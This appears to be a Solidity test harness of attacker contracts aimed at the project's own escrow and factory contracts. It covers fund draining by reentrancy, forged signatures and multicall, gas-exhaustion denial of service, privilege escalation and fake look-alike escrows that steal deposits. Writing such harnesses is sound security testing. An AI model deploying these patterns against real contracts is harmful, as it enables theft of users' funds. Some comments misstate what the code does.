// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IUserEscrow {
    function execute(address target, uint256 value, bytes calldata data) external payable returns (bytes memory);
    function multicall(address[] calldata targets, uint256[] calldata values, bytes[] calldata datas) external payable returns (bytes[] memory);
    function withdrawETH(address payable to) external;
    function withdrawToken(address token, address to) external;
    function executeWithSignatures(address target, uint256 value, bytes calldata data, bytes[] calldata signatures, uint256 deadline) external payable;
    function owner() external view returns (address);
    function nonce() external view returns (uint256);
    function isApproverMap(address) external view returns (bool);
}

interface IEscrowFactory {
    function setGlobalEmergency(bool _paused) external;
    function pauseFunction(bytes4 selector, bool _paused) external;
    function createEscrow(address poolAddress, address[] memory approvers, uint256 threshold, uint256 maxCalls) external returns (address);
}

/**
 * @title DrainBot
 * @dev Sophisticated fund extraction bot yang mencoba berbagai metode
 */
contract DrainBot {
    IUserEscrow public target;
    address public owner;

    mapping(string => bool) public attemptedMethods;
    mapping(string => uint256) public successfulExtractions;

    uint256 public totalDrained;
    bool public isActive;

    event DrainAttempt(string method, uint256 amount, bool success);
    event FundsExtracted(string method, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setTarget(address _target) external onlyOwner {
        target = IUserEscrow(_target);
    }

    function activateDrainBot() external onlyOwner {
        isActive = true;
        _attemptAllDrainMethods();
    }

    function _attemptAllDrainMethods() internal {
        // Method 1: Direct withdrawal attempt
        _attemptDirectWithdrawal();

        // Method 2: Execute call redirection
        _attemptExecuteRedirection();

        // Method 3: Multicall exploitation
        _attemptMulticallDrain();

        // Method 4: Signature forgery
        _attemptSignatureForgery();

        // Method 5: Reentrancy combination
        _attemptReentrancyCombo();

        // Method 6: State manipulation
        _attemptStateManipulation();
    }

    function _attemptDirectWithdrawal() internal {
        if (attemptedMethods["direct_withdrawal"]) return;
        attemptedMethods["direct_withdrawal"] = true;

        try target.withdrawETH(payable(address(this))) {
            uint256 balance = address(this).balance;
            successfulExtractions["direct_withdrawal"] = balance;
            totalDrained += balance;
            emit FundsExtracted("direct_withdrawal", balance);
            emit DrainAttempt("direct_withdrawal", balance, true);
        } catch {
            emit DrainAttempt("direct_withdrawal", 0, false);
        }
    }

    function _attemptExecuteRedirection() internal {
        if (attemptedMethods["execute_redirection"]) return;
        attemptedMethods["execute_redirection"] = true;

        // Try to redirect execute call to drain funds
        bytes memory drainData = abi.encodeWithSignature("withdrawETH(address)", address(this));

        try target.execute(address(target), 0, drainData) {
            uint256 newBalance = address(this).balance - totalDrained;
            successfulExtractions["execute_redirection"] = newBalance;
            totalDrained += newBalance;
            emit FundsExtracted("execute_redirection", newBalance);
            emit DrainAttempt("execute_redirection", newBalance, true);
        } catch {
            emit DrainAttempt("execute_redirection", 0, false);
        }
    }

    function _attemptMulticallDrain() internal {
        if (attemptedMethods["multicall_drain"]) return;
        attemptedMethods["multicall_drain"] = true;

        // Setup multicall to drain multiple assets
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory datas = new bytes[](3);

        targets[0] = address(target);
        targets[1] = address(target);
        targets[2] = address(this);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;

        datas[0] = abi.encodeWithSignature("withdrawETH(address)", address(this));
        datas[1] = abi.encodeWithSignature("withdrawToken(address,address)", address(0), address(this));
        datas[2] = abi.encodeWithSignature("collectDrainedFunds()");

        try target.multicall(targets, values, datas) {
            uint256 newBalance = address(this).balance - totalDrained;
            successfulExtractions["multicall_drain"] = newBalance;
            totalDrained += newBalance;
            emit FundsExtracted("multicall_drain", newBalance);
            emit DrainAttempt("multicall_drain", newBalance, true);
        } catch {
            emit DrainAttempt("multicall_drain", 0, false);
        }
    }

    function _attemptSignatureForgery() internal {
        if (attemptedMethods["signature_forgery"]) return;
        attemptedMethods["signature_forgery"] = true;

        // Create fake signatures
        bytes[] memory fakeSignatures = new bytes[](2);
        fakeSignatures[0] = abi.encodePacked(bytes32(uint256(1)), bytes32(uint256(2)), uint8(27));
        fakeSignatures[1] = abi.encodePacked(bytes32(uint256(3)), bytes32(uint256(4)), uint8(28));

        bytes memory drainData = abi.encodeWithSignature("withdrawETH(address)", address(this));

        try target.executeWithSignatures(
            address(this),
            0,
            drainData,
            fakeSignatures,
            block.timestamp + 1 hours
        ) {
            uint256 newBalance = address(this).balance - totalDrained;
            successfulExtractions["signature_forgery"] = newBalance;
            totalDrained += newBalance;
            emit FundsExtracted("signature_forgery", newBalance);
            emit DrainAttempt("signature_forgery", newBalance, true);
        } catch {
            emit DrainAttempt("signature_forgery", 0, false);
        }
    }

    function _attemptReentrancyCombo() internal {
        if (attemptedMethods["reentrancy_combo"]) return;
        attemptedMethods["reentrancy_combo"] = true;

        // Complex reentrancy attack
        isActive = true; // Enable reentrancy mode

        try target.execute(address(this), 0, abi.encodeWithSignature("triggerReentrancy()")) {
            uint256 newBalance = address(this).balance - totalDrained;
            successfulExtractions["reentrancy_combo"] = newBalance;
            totalDrained += newBalance;
            emit FundsExtracted("reentrancy_combo", newBalance);
            emit DrainAttempt("reentrancy_combo", newBalance, true);
        } catch {
            emit DrainAttempt("reentrancy_combo", 0, false);
        }

        isActive = false;
    }

    function _attemptStateManipulation() internal {
        if (attemptedMethods["state_manipulation"]) return;
        attemptedMethods["state_manipulation"] = true;

        // Try to manipulate contract state
        try target.execute(
            address(this),
            0,
            abi.encodeWithSignature("manipulateState(address)", address(target))
        ) {
            emit DrainAttempt("state_manipulation", 0, true);
        } catch {
            emit DrainAttempt("state_manipulation", 0, false);
        }
    }

    // Callback functions
    function triggerReentrancy() external {
        if (isActive && msg.sender == address(target)) {
            // Attempt reentrancy
            try target.withdrawETH(payable(address(this))) {} catch {}
        }
    }

    function manipulateState(address escrow) external {
        // Try to manipulate escrow state
        assembly {
            // Attempt storage manipulation
            sstore(0x0, escrow)
        }
    }

    function collectDrainedFunds() external {
        // Collect any funds that might have been drained
    }

    // Summary function
    function getDrainReport() external view returns (
        uint256 totalAmount,
        string[] memory successfulMethods,
        uint256[] memory amounts
    ) {
        string[] memory methods = new string[](6);
        methods[0] = "direct_withdrawal";
        methods[1] = "execute_redirection";
        methods[2] = "multicall_drain";
        methods[3] = "signature_forgery";
        methods[4] = "reentrancy_combo";
        methods[5] = "state_manipulation";

        uint256 successCount = 0;
        for (uint256 i = 0; i < methods.length; i++) {
            if (successfulExtractions[methods[i]] > 0) {
                successCount++;
            }
        }

        successfulMethods = new string[](successCount);
        amounts = new uint256[](successCount);

        uint256 index = 0;
        for (uint256 i = 0; i < methods.length; i++) {
            if (successfulExtractions[methods[i]] > 0) {
                successfulMethods[index] = methods[i];
                amounts[index] = successfulExtractions[methods[i]];
                index++;
            }
        }

        totalAmount = totalDrained;
    }

    receive() external payable {}
    fallback() external payable {}
}

/**
 * @title DOSAttacker
 * @dev Contract untuk various denial of service attacks
 */
contract DOSAttacker {
    IUserEscrow public target;
    IEscrowFactory public factory;

    bool public isAttacking;
    uint256 public gasConsumptionTarget = 30000000; // 30M gas

    event DOSAttempt(string attackType, bool success);

    constructor() {}

    function setTargets(address _escrow, address _factory) external {
        target = IUserEscrow(_escrow);
        factory = IEscrowFactory(_factory);
    }

    // Attack 1: Gas limit exhaustion
    function attemptGasExhaustion() external {
        uint256[] memory largeArray = new uint256[](100000);

        for (uint256 i = 0; i < 100000; i++) {
            largeArray[i] = i * i;
        }

        try target.execute(
            address(this),
            0,
            abi.encodeWithSignature("gasConsumingFunction(uint256[])", largeArray)
        ) {
            emit DOSAttempt("gas_exhaustion", true);
        } catch {
            emit DOSAttempt("gas_exhaustion", false);
        }
    }

    // Attack 2: Infinite loop attack
    function attemptInfiniteLoop() external {
        try target.execute(
            address(this),
            0,
            abi.encodeWithSignature("infiniteLoopFunction()")
        ) {
            emit DOSAttempt("infinite_loop", true);
        } catch {
            emit DOSAttempt("infinite_loop", false);
        }
    }

    // Attack 3: Memory exhaustion
    function attemptMemoryExhaustion() external {
        try target.execute(
            address(this),
            0,
            abi.encodeWithSignature("memoryExhaustionFunction()")
        ) {
            emit DOSAttempt("memory_exhaustion", true);
        } catch {
            emit DOSAttempt("memory_exhaustion", false);
        }
    }

    // Attack 4: Block gas limit attack
    function attemptBlockGasLimitAttack() external {
        address[] memory targets = new address[](1000);
        uint256[] memory values = new uint256[](1000);
        bytes[] memory datas = new bytes[](1000);

        for (uint256 i = 0; i < 1000; i++) {
            targets[i] = address(this);
            values[i] = 0;
            datas[i] = abi.encodeWithSignature("gasConsumingFunction(uint256[])", new uint256[](100));
        }

        try target.multicall(targets, values, datas) {
            emit DOSAttempt("block_gas_limit", true);
        } catch {
            emit DOSAttempt("block_gas_limit", false);
        }
    }

    // Attack 5: Emergency system DOS
    function attemptEmergencySystemDOS() external {
        // Try to flood emergency system with requests
        for (uint256 i = 0; i < 1000; i++) {
            try factory.setGlobalEmergency(i % 2 == 0) {} catch {}
            try factory.pauseFunction(bytes4(uint32(i)), i % 2 == 0) {} catch {}
        }

        emit DOSAttempt("emergency_system_dos", true);
    }

    // Malicious callback functions
    function gasConsumingFunction(uint256[] memory data) external {
        uint256 sum = 0;
        for (uint256 i = 0; i < data.length; i++) {
            for (uint256 j = 0; j < 1000; j++) {
                sum += data[i] * j;
            }
        }

        // Try to consume more gas
        while (gasleft() > gasConsumptionTarget) {
            sum += 1;
        }
    }

    function infiniteLoopFunction() external {
        // This will eventually fail due to gas limit
        while (true) {
            assembly {
                // Consume gas
                let x := add(1, 1)
            }
        }
    }

    function memoryExhaustionFunction() external {
        // Try to allocate large amounts of memory
        bytes memory largeData = new bytes(100000000); // 100MB
        for (uint256 i = 0; i < largeData.length; i++) {
            largeData[i] = bytes1(uint8(i % 256));
        }
    }
}

/**
 * @title PermissionEscalator
 * @dev Contract untuk testing privilege escalation attacks
 */
contract PermissionEscalator {
    IUserEscrow public target;
    IEscrowFactory public factory;

    mapping(string => bool) public escalationAttempts;

    event EscalationAttempt(string method, bool success);

    constructor() {}

    function setTargets(address _escrow, address _factory) external {
        target = IUserEscrow(_escrow);
        factory = IEscrowFactory(_factory);
    }

    // Attack 1: Owner privilege escalation
    function attemptOwnerEscalation() external {
        escalationAttempts["owner"] = true;

        try target.execute(
            address(this),
            0,
            abi.encodeWithSignature("becomeOwner()")
        ) {
            emit EscalationAttempt("owner_escalation", true);
        } catch {
            emit EscalationAttempt("owner_escalation", false);
        }
    }

    // Attack 2: Approver self-addition
    function attemptApproverEscalation() external {
        escalationAttempts["approver"] = true;

        try target.execute(
            address(target),
            0,
            abi.encodeWithSignature("addApprover(address)", address(this))
        ) {
            emit EscalationAttempt("approver_escalation", true);
        } catch {
            emit EscalationAttempt("approver_escalation", false);
        }
    }

    // Attack 3: Emergency admin escalation
    function attemptEmergencyAdminEscalation() external {
        escalationAttempts["emergency_admin"] = true;

        try factory.setGlobalEmergency(true) {
            emit EscalationAttempt("emergency_admin_escalation", true);
        } catch {
            emit EscalationAttempt("emergency_admin_escalation", false);
        }
    }

    // Attack 4: Factory owner escalation
    function attemptFactoryOwnerEscalation() external {
        escalationAttempts["factory_owner"] = true;

        try this.executeFactoryTakeover() {
            emit EscalationAttempt("factory_owner_escalation", true);
        } catch {
            emit EscalationAttempt("factory_owner_escalation", false);
        }
    }

    // Malicious callback functions
    function becomeOwner() external {
        // Try to manipulate storage to become owner
        assembly {
            // Attempt to overwrite owner storage slot
            sstore(0x0, address())
        }
    }

    function executeFactoryTakeover() external {
        // Complex factory takeover attempt
        address[] memory maliciousApprovers = new address[](1);
        maliciousApprovers[0] = address(this);

        // Try to create escrow and manipulate it
        try factory.createEscrow(
            address(this),
            maliciousApprovers,
            1,
            10
        ) returns (address newEscrow) {
            // If successful, try to use new escrow to attack others
            IUserEscrow(newEscrow).execute(
                address(this),
                0,
                abi.encodeWithSignature("manipulateFactory()")
            );
        } catch {}
    }

    function manipulateFactory() external {
        // Try to manipulate factory state
    }
}

/**
 * @title MaliciousFactory
 * @dev Fake factory untuk testing registry poisoning
 */
contract MaliciousFactory {
    event MaliciousEscrowCreated(address escrow, address victim);

    function createEscrow(
        address poolAddress,
        address[] memory approvers,
        uint256 threshold,
        uint256 maxCalls
    ) external returns (address) {
        // Create malicious escrow that looks legitimate
        MaliciousEscrow maliciousEscrow = new MaliciousEscrow(msg.sender);

        emit MaliciousEscrowCreated(address(maliciousEscrow), msg.sender);
        return address(maliciousEscrow);
    }
}

/**
 * @title MaliciousEscrow
 * @dev Fake escrow yang mencoba meniru UserEscrow
 */
contract MaliciousEscrow {
    address public owner;
    mapping(address => bool) public hasStolen;

    event FundsStolen(address victim, uint256 amount);

    constructor(address _victim) {
        owner = _victim; // Pretend victim is owner
    }

    // Fake functions that look like real escrow
    function withdrawETH(address payable to) external {
        // Secretly steal funds instead of legitimate withdrawal
        uint256 amount = address(this).balance;
        if (amount > 0) {
            payable(owner).transfer(amount); // Send to attacker instead
            hasStolen[msg.sender] = true;
            emit FundsStolen(msg.sender, amount);
        }
    }

    function execute(address target, uint256 value, bytes calldata data) external payable returns (bytes memory) {
        // Malicious execute that steals funds
        if (msg.value > 0) {
            hasStolen[msg.sender] = true;
            emit FundsStolen(msg.sender, msg.value);
        }
        return "";
    }

    receive() external payable {
        // Steal any ETH sent here
        hasStolen[msg.sender] = true;
        emit FundsStolen(msg.sender, msg.value);
    }
}